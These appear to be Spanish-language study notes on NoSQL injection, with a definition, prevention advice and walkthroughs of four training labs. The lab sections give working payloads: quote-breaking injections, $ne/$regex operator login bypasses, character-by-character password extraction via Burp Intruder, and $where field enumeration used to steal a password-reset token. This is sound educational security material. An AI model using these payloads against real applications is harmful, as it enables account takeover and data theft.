----
### QUE ES?
Una **NoSQL Injection** es una vulnerabilidad donde un atacante introduce datos maliciosos que modifican las **consultas de una base de datos NoSQL** (como MongoDB, CouchDB, etc.).  
Ocurre cuando la aplicación **inserta directamente el input del usuario dentro de una consulta NoSQL** sin validarlo correctamente.
En lugar de inyectar SQL, el atacante manipula **estructuras JSON, operadores de consulta o lógica de filtrado** para cambiar el comportamiento de la query.
Esto puede permitir **saltarse autenticaciones, acceder a datos de otros usuarios o extraer información de la base de datos**.
Se previene **validando el input, evitando construir consultas dinámicamente con datos del usuario y usando ORMs o consultas parametrizadas**.
#### PASOS:
- **PROBAR COSAS TIPO:** meter una comilla para producir un error, meter `Gifts'||1||'` o `Gifts' && 1 && 'x
- **PROBAR BYPASS DE LOGIN** bypass el login mediante *operadores de comparación*.
- **ENUMERAR USUARIOS** enumerar usuarios mediante *regex*.
- **ENUMERAR PASSWORD** enumerar contraseñas mediante *regex*.
### LAB1: DETECTING NOSQL INJECTION
En este primer lab vemos un filtro de categorías, podemos tratar de interceptar con *burpsuite* la request y meterle una comilla para provocar un fallo. En el fallo vemos que lo que se usa por detrás es *MongoDB* confirmando *NoSQL*. Para explotarlo podemos probar algo como `Gifts'||1||'
### LAB2: EXPLOITING NOSQL OPERATOR INJECTION TO BYPASS AUTHENTICATION
En este laboratorio si seguimos todo el flujo de request hasta loguearnos podemos ver una request a `/login` la cual usa *JSON* para enviar los datos. Podemos tratar de bypasearlo utilizando *operadores de comparación*.
`{
`	"username":{
`		"$regex":"^ad"
`},
`	"password": 
`		"$ne" :"xfb"      
`	}
`}
### LAB3: EXPLOITING NOSQL INJECTION TO EXTRACT DATA
En este laboratorio si seguimos el flujo de login veremos una request `/user/lookup?user=wiener` bastante sospechosa que nos devuelve información sobre el usuario. Podemos probar a meterle algo com `wiener'||1||'` y vemos que nos devuelve los datos de administrator pero no su contraseña. Para intentar sacar la contraseña podemos primero intentar sacar el largo de esta con `administrator' && this.password.length < 30 || 'a'=='b` de esta forma vemos que con 9 nos lo lista pero con 8 no. Nos llevamos la request al *intruder* de esta manera `administrator' && this.password[§0§]=='§a§` y seleccionamos un *Cluster Bomb Attack* de esta forma añadimos dos payloads el primero del 0 al 7 y el segundo de la a a la z.
### LAB4: EXPLOITING NOSQL OPERATOR INJECTION TO EXTRACT UNKNOWN FIELDS
En este laboratorio vemos un login con reset password, tratamos de loguearnos y seguimos todo el flujo en *burpsuite*. Vemos que usa una base de datos *MongoDb* provocando un fallo por lo que vamos a probar injecciones **NOSQL**. Intentamos bypasear el login con: 
`"username":"carlos",
`"password":{"$ne":"Invalid"
`}
Pero vemos que dice que la cuenta esta bloqueada y que debemos resetear la contraseña. Podemos probar a listar mas parámetros que se puedan meter, parámetros **NOSQL**:
`"username":"carlos",
`"password":{"$ne":"Invalid"
`},
`"where":"1"
Vemos que es valido así que lo fuzzeamos desde el *intruder* para descubrir mas parámetros. Usamos un *Cluster Bomb Attack* con 2 payloads, el primero de numeros del 1 al 20 y el segundo con números del 0 al 9, letras minúsculas y mayusculas.
`"username":"carlos",
`"password":{"$ne":"Invalid"
`},
`"where":"Object.keys(this)[1].match('^.{&1&}&2&.*')"
Vemos que aparece la palabra username así que vamos a ver cual es la siguiente: 
`"username":"carlos",
`"password":{"$ne":"Invalid"
`},
`"where":"Object.keys(this)[2].match('^.{&1&}&2&.*')"
Aquí encontramos algo interesante que es `YOURTOKENNAME`, para extraer su valor: 
`"$where":"this.YOURTOKENNAME.match('^.{}.*')"
Cogemos el valor y enviamos una reques a `/forgot-password¿YOURTOKENNAME=TOKENVALUE` tras esto en la respuesta *Request in browser* -> *Original session*.